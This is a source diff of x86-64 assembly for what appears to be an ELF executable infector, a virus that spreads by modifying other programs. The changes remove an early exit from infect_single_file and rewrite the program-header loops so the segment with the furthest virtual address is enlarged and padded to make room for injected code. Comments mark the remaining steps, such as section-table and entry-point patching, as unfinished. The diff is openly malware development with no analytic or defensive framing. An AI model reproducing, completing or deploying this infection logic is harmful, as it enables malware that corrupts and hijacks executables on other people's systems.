@@ -430,11 +430,7 @@ infect_single_file:
     pop rcx
     test rax, rax
     jz .close_munmap
-
-    ; NOTE: refactor to select last segment here
-    jmp exit_ok
     
-
     ; go to entry point offset in buffer, check if infected 
     ; if infected, close and munmap and return
     mov rdi, r9
@@ -502,8 +498,6 @@ infect_single_file:
 
     ; check next program header (segment) comes next, and calulate space avail ((pheader_nxt.offset) - (pheader_curr.offset + size))
     ; if smaller than _end - _start, (WAIT NO)
-
-    ; jmp exit_ok
 
 
 .close_munmap:
@@ -578,7 +572,7 @@ get_entry_offset:
     ; vaddr -> rdx 
     mov rdx, qword [rdi + 0x10]
     
-    ; vaddr + size -> rcx
+    ; vaddr + file size -> rcx
     mov rcx, qword [rdi + 0x20]
     add rcx, rdx
 
@@ -613,10 +607,13 @@ get_entry_offset:
 ; returns - entry change delta
 patching_pass:
     push rbx
-    push r10 ; start offset to r10
+    push r10
     push r9 ; mamp buf to r9
     push r8 ; entry addr to r8
 
+    mov rax, 0 ; furthest vaddr -> rax
+
+    mov r10, 0 ; furthest addr phnum -> r10
 
     mov r9, rdi ; mmap buf -> r9
 
@@ -628,52 +625,28 @@ patching_pass:
     
     add rsi, 0x20
     movzx rsi, word [rsi] ; phnum  -> rsi
-
     mov rbx, 0
 
-; locate the pheader for entry
 .pheader_loop:
+    ; locate segment with furthest vaddr
     cmp rbx, rsi
-    jge .pheader_loop_end
+    je .pheader_loop_end
 
     ; vaddr -> rdx 
     mov rdx, qword [rdi + 0x10]
 
-    ; vaddr + size -> rcx
-    mov rcx, qword [rdi + 0x20]
+    ; vaddr + size in mem -> rcx
+    mov rcx, qword [rdi + 0x28]
     add rcx, rdx
 
-    ; check r8 should be entry vaddr
-    ; rdx should be vaddr of pheader
-    ; rcx should be vaddr of pheader + size
-	call break
+    ; is it bigger than curr furthest vaddr? if no, continue
+    cmp rcx, rax
+    jle .pheader_loop_iter
 
-    ; if entry is bigger than pheader start + size, continue
-    cmp r8, rcx
-    jge .pheader_loop_iter ; NOTE: will there be an edge case here?
+    ; if yes, set num and furthest addr
+    mov rax, rcx
+    mov r10, rbx
 
-	; if is lesser than pheader start, its in a subsequent pheader
-    cmp r8, rdx
-    jl .pheader_loop_subsequent_branch
-
-	; if its in range,
-    ; change filesize and memsize to add PAD_SZ
-    add qword [rdi + 0x20], MAX_FILE_PAD
-    add qword [rdi + 0x28], MAX_FILE_PAD
-
-
-
-    ; take note of start offset
-    mov r10, qword [rdi + 0x08] ; start offset -> r10
-
-    jmp .pheader_loop_iter
-
-; if it is a subsequent header
-.pheader_loop_subsequent_branch:
-    ; change offset to + PAD_SZ
-    add qword [rdi + 0x08], MAX_FILE_PAD
-
-    ; change vaddr too? NOTE: this may cause overlapping of virtual addresses
 
 .pheader_loop_iter:
     add rbx, 1
@@ -682,12 +655,19 @@ patching_pass:
 
 .pheader_loop_end:
 
-	
+	sub rsi, r10
+    imul rsi, 0x38
+    sub rdi, rsi
+
+    ; change mem and file size
+    add qword [rdi + 0x20], MAX_FILE_PAD
+    add qword [rdi + 0x28], MAX_FILE_PAD
+
     ; locate section header for start offset
 
     ; if section header in range, change its offset only 
     
-
+    ; change section table offset
 
     ; change entry address and return the delta
 
@@ -703,51 +683,41 @@ patching_pass:
 ; rsi - file size
 padding_pass:
     push rbx
-    push r10 ; file size to r10
-	push r9 ; mamp buf to r9
-    push r8 ; entry addr to r8
+    push r8
+    push r9
+    push r10
+ 
+    mov rax, rsi ; file size -> rax
 
-    mov r10, rsi ; file size to r10
+    mov r8, 0 ; furthest vaddr -> r8 
 
-    mov r9, rdi ; mmap buf -> r9
+    mov r9, 0 ; furthest addr phnum -> r9
 
-    add rdi, 0x18
-    mov r8, qword [rdi] ; entry addr -> r8
-
-    mov rsi, rdi
-    add rdi, 0x28 ; pheader table addr -> rdi
+	mov rsi, rdi
+    add rdi, 0x40 ; pheader table addr -> rdi
     
-    add rsi, 0x20
+    add rsi, 0x38
     movzx rsi, word [rsi] ; phnum  -> rsi
-
     mov rbx, 0
 
-; locate the pheader for entry
 .loop:
     cmp rbx, rsi
-    je exit_err
+    je .loop_end
 
     ; vaddr -> rdx 
     mov rdx, qword [rdi + 0x10]
     
-    ; vaddr + size -> rcx
-    mov rcx, qword [rdi + 0x20]
+    ; vaddr + size in mem -> rcx
+    mov rcx, qword [rdi + 0x28]
     add rcx, rdx
 
-    ; cmp to see entry_addr in range? if yes, record offset + size and next segment offset
-    ; if no, continue
-    cmp r8, rdx
-    jl .loop_iter
+    ; is it bigger than curr furthest vaddr? if no, continue
+    cmp rcx, r8
+    jle .loop_iter
 
-    cmp r8, rcx
-    jge .loop_iter
-
-	; if yes
-    ; entry segment offset + size -> rdx
-    mov rdx, [rdi + 0x08]
-    add rdx, [rdi + 0x20]
-
-    jmp .loop_end
+    ; if yes, set num and furthest addr
+    mov r8, rcx
+    mov r9, rbx
 
 
 .loop_iter:
@@ -755,27 +725,41 @@ padding_pass:
     add rdi, 0x38
     jmp .loop
 
-
 .loop_end:
-    
-    ; fill in start_offset -> end_offset
+
+    ; get offset 
+    sub rsi, r9
+    imul rsi, 0x38
+    sub rdi, rsi
+
+    mov rdx, qword [rdi + 0x08] 
+    add rdx, qword [rdi + 0x20] ; dst offset for mempad -> rdx
+
+	; fill in start_offset -> end_offset
 
     ; rdi - dst (mmap buf + start_offset)
     ; rsi - number of bytes (MAX_FILE_PAD)
     ; rdx - barrier ptr (mmap buf + (filesz - MAX_FILE_PAD)) 
-    mov rdi, r9
-    add rdi, rdx
+    imul r9, 0x38
+    sub rdi, r9
+    sub rdi, 0x40 ; rdi should be the mmap buf
+    
+    add rdx, rdi
+    
+    add rdi, rax
+    sub rdi, MAX_FILE_PAD ; barrier ptr -> rdi
+
+    mov rax, rdi
+    mov rdi, rdx
+    mov rdx, rax
     mov rsi, MAX_FILE_PAD
-    mov rdx, r9
-    add rdx, r10
-    sub rdx, MAX_FILE_PAD
     call mempad
 
 
 .ret:
-    pop r8
+	pop r10
     pop r9
-    pop r10
+    pop r8
     pop rbx
     ret
 
